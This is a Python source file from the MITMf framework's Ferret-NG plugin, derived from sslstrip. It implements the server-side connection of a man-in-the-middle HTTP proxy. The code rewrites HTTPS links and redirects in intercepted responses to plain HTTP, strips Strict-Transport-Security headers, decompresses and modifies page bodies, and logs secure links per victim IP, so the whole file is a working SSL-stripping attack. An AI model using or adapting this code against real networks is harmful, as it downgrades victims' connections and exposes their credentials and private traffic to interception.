# Copyright (c) 2014-2016 Moxie Marlinspike, Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging 
import re 
import string
import random 
import zlib 
import gzip
import StringIO
import sys

from twisted.web.http import HTTPClient
from URLMonitor import URLMonitor

mitmf_logger = logging.getLogger('mitmf')

class ServerConnection(HTTPClient):

    ''' The server connection is where we do the bulk of the stripping.  Everything that
    comes back is examined.  The headers we dont like are removed, and the links are stripped
    from HTTPS to HTTP.
    '''

    urlExpression     = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
    urlType           = re.compile(r"https://", re.IGNORECASE)
    urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
    urlTypewww        = re.compile(r"https://www", re.IGNORECASE)
    urlwExplicitPort  = re.compile(r'https://www([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
    urlToken1         = re.compile(r'(https://[a-zA-Z0-9./]+\?)', re.IGNORECASE)
    urlToken2         = re.compile(r'(https://[a-zA-Z0-9./]+)\?{0}', re.IGNORECASE)
    #urlToken2        = re.compile(r'(https://[a-zA-Z0-9.]+/?[a-zA-Z0-9.]*/?)\?{0}', re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):

        self.command          = command
        self.uri              = uri
        self.postData         = postData
        self.headers          = headers
        self.client           = client
        self.clientInfo       = None
        self.urlMonitor       = URLMonitor.getInstance()
        self.isImageRequest   = False
        self.isCompressed     = False
        self.contentLength    = None
        self.shutdownComplete = False

    def getPostPrefix(self):
        return "POST"

    def sendRequest(self):
        if self.command == 'GET':

            mitmf_logger.debug(self.client.getClientIP() + " [Ferret-NG] Sending Request: {}".format(self.headers['host']))

        self.sendCommand(self.command, self.uri)

    def sendHeaders(self):
        for header, value in self.headers.iteritems():
            mitmf_logger.debug("[Ferret-NG] [ServerConnection] Sending header: ({}: {})".format(header, value))
            self.sendHeader(header, value)

        self.endHeaders()

    def sendPostData(self):

        self.transport.write(self.postData)

    def connectionMade(self):
        mitmf_logger.debug("[Ferret-NG] [ServerConnection] HTTP connection made.")
        self.sendRequest()
        self.sendHeaders()
        
        if (self.command == 'POST'):
            self.sendPostData()

    def handleStatus(self, version, code, message):
        mitmf_logger.debug("[Ferret-NG] [ServerConnection] Server response: {} {} {}".format(version, code, message))
        self.client.setResponseCode(int(code), message)

    def handleHeader(self, key, value):
        if (key.lower() == 'location'):
            value = self.replaceSecureLinks(value)

        if (key.lower() == 'content-type'):
            if (value.find('image') != -1):
                self.isImageRequest = True
                mitmf_logger.debug("[Ferret-NG] [ServerConnection] Response is image content, not scanning")

        if (key.lower() == 'content-encoding'):
            if (value.find('gzip') != -1):
                mitmf_logger.debug("[Ferret-NG] [ServerConnection] Response is compressed")
                self.isCompressed = True

        elif (key.lower()== 'strict-transport-security'):
            mitmf_logger.debug("[Ferret-NG] [ServerConnection] Zapped a strict-trasport-security header")

        elif (key.lower() == 'content-length'):
            self.contentLength = value

        elif (key.lower() == 'set-cookie'):
            self.client.responseHeaders.addRawHeader(key, value)

        else:
            self.client.setHeader(key, value)

    def handleEndHeaders(self):
        if (self.isImageRequest and self.contentLength != None):
            self.client.setHeader("Content-Length", self.contentLength)

        if self.length == 0:
            self.shutdown()

        if logging.getLevelName(mitmf_logger.getEffectiveLevel()) == "DEBUG":
            for header, value in self.client.headers.iteritems():
                mitmf_logger.debug("[Ferret-NG] [ServerConnection] Receiving header: ({}: {})".format(header, value)) 

    def handleResponsePart(self, data):
        if (self.isImageRequest):
            self.client.write(data)
        else:
            HTTPClient.handleResponsePart(self, data)

    def handleResponseEnd(self):
        if (self.isImageRequest):
            self.shutdown()
        else:
            try:
                HTTPClient.handleResponseEnd(self) #Gets rid of some generic errors
            except:
                pass

    def handleResponse(self, data):
        if (self.isCompressed):
            mitmf_logger.debug("[Ferret-NG] [ServerConnection] Decompressing content...")
            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()

        data = self.replaceSecureLinks(data)

        mitmf_logger.debug("[Ferret-NG] [ServerConnection] Read from server {} bytes of data".format(len(data)))

        if (self.contentLength != None):
            self.client.setHeader('Content-Length', len(data))
        
        try:
            self.client.write(data)
        except:
            pass

        try:
            self.shutdown()
        except:
            mitmf_logger.info("[Ferret-NG] [ServerConnection] Client connection dropped before request finished.")

    def replaceSecureLinks(self, data):

        iterator = re.finditer(ServerConnection.urlExpression, data)

        for match in iterator:
            url = match.group()

            mitmf_logger.debug("[Ferret-NG] [ServerConnection] Found secure reference: " + url)

            url = url.replace('https://', 'http://', 1)
            url = url.replace('&amp;', '&')
            self.urlMonitor.addSecureLink(self.client.getClientIP(), url)

        data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
        return re.sub(ServerConnection.urlType, 'http://', data)

    def shutdown(self):
        if not self.shutdownComplete:
            self.shutdownComplete = True
            try:
                self.client.finish()
                self.transport.loseConnection()
            except:
                pass
